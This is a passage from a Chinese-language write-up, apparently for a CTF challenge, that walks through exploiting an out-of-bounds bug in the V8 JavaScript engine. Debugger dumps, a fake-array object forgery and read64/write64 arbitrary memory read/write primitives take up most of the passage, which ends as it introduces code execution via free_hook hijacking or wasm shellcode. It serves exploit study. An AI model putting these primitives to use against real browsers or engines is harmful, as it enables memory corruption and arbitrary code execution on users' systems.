import binascii  
import struct
hex_list_64 = ['00000e81fe702ed9']
for value in hex_list_64:  
print(struct.unpack('>d', binascii.unhexlify(value)))
// 转换输出如下  
(7.881079421936e-311,)  
可以看到，PoC中借助漏洞越界读取了elements对象后面的8字节，而这8字节正是数组a的map指针。  
越界写入  
在调试器中再次输入c，继续运行PoC代码，断下后再次进行观察：  
pwndbg> telescope 0x294872acde39-1  
00:0000│ 0x294872acde38 —▸ 0x4dff36414f9 ◂— 0x4dff36401  
01:0008│ 0x294872acde40 ◂— 0x400000000  
02:0010│ 0x294872acde48 ◂— 0x3ff0000000000000  
03:0018│ 0x294872acde50 ◂— 0x4000000000000000  
04:0020│ 0x294872acde58 ◂— 0x4008000000000000  
05:0028│ 0x294872acde60 ◂— 0x3ff199999999999a  
06:0030│ 0x294872acde68 ◂— 0x4000000000000000  job 0x1744cd9cf9c9  
0x1744cd9cf9c9: [JSArray]
  * map: 0x264dae342ed9  [FastProperties]
  * prototype: 0x22ccc9151111 
  * elements: 0x1744cd9cf989  [PACKED_DOUBLE_ELEMENTS]
  * length: 6
  * properties: 0x3a07f47c0c71  {  
#length: 0x11556e8001a9  (const accessor descriptor)  
}
  * elements: 0x1744cd9cf989  { 
        0: 2.08076e-310
        1: 0
        2: 5.40901e-315
        3: 3.39519e-313
        4: 1.1
        5: 2.2
}
// fake_array.elements  
pwndbg> job 0x1744cd9cf989  
0x1744cd9cf989: [FixedDoubleArray]
  * map: 0x3a07f47c14f9 
  * length: 6 
        0: 2.08076e-310
        1: 0
        2: 5.40901e-315
        3: 3.39519e-313
        4: 1.1
        5: 2.2
pwndbg> telescope 0x1744cd9cf989-1  
00:0000│ 0x1744cd9cf988 —▸ 0x3a07f47c14f9 ◂— 0x3a07f47c01  
01:0008│ 0x1744cd9cf990 ◂— 0x600000000  
02:0010│ 0x1744cd9cf998 —▸ 0x264dae342ed9 ◂— 0x400003a07f47c01  
03:0018│ 0x1744cd9cf9a0 ◂— 0x0  
04:0020│ 0x1744cd9cf9a8 ◂— 0x41414141 / _'AAAA'_ /  
05:0028│ 0x1744cd9cf9b0 ◂— 0x1000000000  
06:0030│ 0x1744cd9cf9b8 ◂— 0x3ff199999999999a  
07:0038│ 0x1744cd9cf9c0 ◂— 0x400199999999999a
// 可以看到fake_array.elements在前，大小为0x40字节，第一个element值相对头部偏移为+0x10  
// fake_array紧邻fake_array.elements，其头部相对fake_array.elements头部偏移为+0x40  
pwndbg> p/x 0x1744cd9cf9c9-0x1744cd9cf989  
$1 = 0x40  
Writeup中用来构造任意地址读写原语的思路是这样的：借助任意地址泄露原语计算得到fakearray的第一个元素在内存中的基地址，然后借助任意对象伪造原语将该地址处开始的内存伪造为一个fakedobject，此时数据结构之间的对应关系如下(下图主要参考《从一道CTF题零基础学V8漏洞利用》这篇文章)：
从上图可知，得到伪造的对象后，只要修改fakearray[2]，就可以控制fakedobject的elements成员，在修改elements后，再对faked_object进行读写，就可以读写elements指针指向处的内存，这样就具备了任意地址读写能力，在此基础上封装两个原语即可：  
var fake_array = [  
float_array_map, // map  
i2f(0n), // prototype  
i2f(0x41414141n), // elements  
i2f(0x1000000000n), // length  
1.1,  
2.2,  
];
var fake_array_addr = addressOf(fake_array);  
var fake_object_addr = fake_array_addr - 0x40n + 0x10n;  
var faked_object = fakeObject(fake_object_addr);
function read64(addr)  
{  
fake_array[2] = i2f(addr - 0x10n + 0x1n);  
let read_data = f2i(faked_object[0]);  
console.log("[*] read from: 0x" + hex(addr) + " : 0x" + hex(read_data));  
return read_data;  
}
function write64(addr, data)  
{  
fake_array[2] = i2f(addr - 0x10n + 0x1n);  
faked_object[0] = i2f(data);  
console.log("[*] write to: 0x" + hex(addr) + ": 0x" + hex(data))  
}  
有了任意地址读写原语后，接下来的操作就比较简单了。笔者在此基础上实践了两种方法：
  1. 泄露libc地址，劫持free_hook为system，调用相关函数，传入命令行实现代码执行
  2. 找到wasm的代码页指针，将shellcode拷贝到此代码页，调用wasm接口实现代码执行  
代码执行：劫持free_hook  